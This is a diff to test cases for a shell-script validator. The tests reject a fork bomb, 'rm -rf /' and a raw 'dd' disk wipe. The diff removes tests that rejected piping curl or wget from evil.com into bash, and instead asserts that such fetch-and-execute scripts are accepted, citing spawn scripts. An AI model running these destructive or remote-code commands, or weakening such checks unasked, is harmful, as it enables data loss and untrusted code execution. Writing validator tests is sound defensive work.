@@ -74,11 +74,11 @@ rm -rf /
       expect(() => validateScriptContent(forkBomb)).toThrow("fork bomb");
     });
 
-    it("should reject nested curl|bash", () => {
-      const nestedCurl = `#!/bin/bash
-curl http://evil.com/script.sh | bash
+    it("should accept scripts with curl|bash (used by spawn scripts)", () => {
+      const curlBash = `#!/bin/bash
+curl http://example.com/install.sh | bash
 `;
-      expect(() => validateScriptContent(nestedCurl)).toThrow("nested curl|bash");
+      expect(() => validateScriptContent(curlBash)).not.toThrow();
     });
 
     it("should reject filesystem formatting", () => {
@@ -103,11 +103,11 @@ dd if=/dev/zero of=/dev/sda
       expect(() => validateScriptContent(ddScript)).toThrow("raw disk operation");
     });
 
-    it("should reject nested wget|bash", () => {
-      const nestedWget = `#!/bin/bash
-wget http://evil.com/script.sh | sh
+    it("should accept scripts with wget|bash (used by spawn scripts)", () => {
+      const wgetBash = `#!/bin/bash
+wget http://example.com/install.sh | sh
 `;
-      expect(() => validateScriptContent(nestedWget)).toThrow("nested wget|bash");
+      expect(() => validateScriptContent(wgetBash)).not.toThrow();
     });
   });
 
